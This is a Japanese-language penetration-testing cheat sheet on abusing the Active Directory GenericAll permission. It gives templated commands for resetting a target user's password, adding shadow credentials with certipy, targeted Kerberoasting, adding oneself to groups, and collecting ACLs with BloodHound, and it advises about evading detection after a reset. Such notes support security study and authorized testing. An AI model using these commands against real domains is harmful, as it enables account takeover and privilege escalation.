# GenericAll の悪用

## 概要

`GenericAll` は対象オブジェクトへの完全制御権限。ユーザーオブジェクト・グループオブジェクト・コンピューターオブジェクトのいずれに対しても強力な攻撃ベクターになる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericAll--> [ターゲットオブジェクト]` が確認できた場合。

---

## 対象オブジェクト別の悪用手法

### ケース1: ユーザーオブジェクトへの GenericAll

**手法A: パスワードのリセット**
```bash
net rpc password [TARGET_USER] '[NEW_PASSWORD]' -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]
```

**手法B: Shadow Credentials（証明書ベースの認証）**
```bash
certipy shadow auto -u '[USER]@[DOMAIN]' -p '[PASSWORD]' -account '[TARGET_USER]' -dc-ip [DC_IP]
```

**手法C: Targeted Kerberoasting（SPN を付与してハッシュ取得）**
```bash
# GenericAll は GenericWrite を包含するため、SPN の設定が可能
python3 targetedKerberoast.py -v -d '[DOMAIN]' -u '[USER]' -p '[PASSWORD]' --dc-ip [DC_IP]
```

### ケース2: グループオブジェクトへの GenericAll

**自分自身をグループに追加する：**
```bash
# Linux 側から
net rpc group addmem '[GROUP_NAME]' '[CURRENT_USER]' \
  -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]

# PowerShell（Windows シェル内から）
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

### ケース3: コンピューターオブジェクトへの GenericAll

**RBCD（Resource-Based Constrained Delegation）攻撃を実施：**

→ 詳細: `../Delegation_Attacks/RBCD.md`

対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性を変更して RBCD を設定できる。

---

## 確認手順（BloodHound で権限を特定してから）

```bash
# 現在のユーザーの ACE を確認
bloodhound-python -u [USER] -p '[PASSWORD]' -d [DOMAIN] -ns [DC_IP] -c ACL
```

BloodHound GUI で対象ノードを選択 → 「Inbound Object Control」→ `GenericAll` を確認。

---

## 注意点・落とし穴

- GenericAll を持っているのが「ユーザー自身」なのか「所属グループ経由」なのかを確認する（BloodHound は両方表示する）
- パスワードリセット後は元のパスワードに戻すか、ターゲットのパスワード変更が検知される可能性を考慮する
- Shadow Credentials は ADCS（Active Directory Certificate Services）環境が必要な場合がある

---

## 関連技術
- RBCD 攻撃 → `../Delegation_Attacks/RBCD.md`
- Kerberoasting → `../Kerberos_Attacks/Kerberoasting.md`
- GenericWrite との違い → `GenericWrite.md`（SPN 設定・logon script のみ）
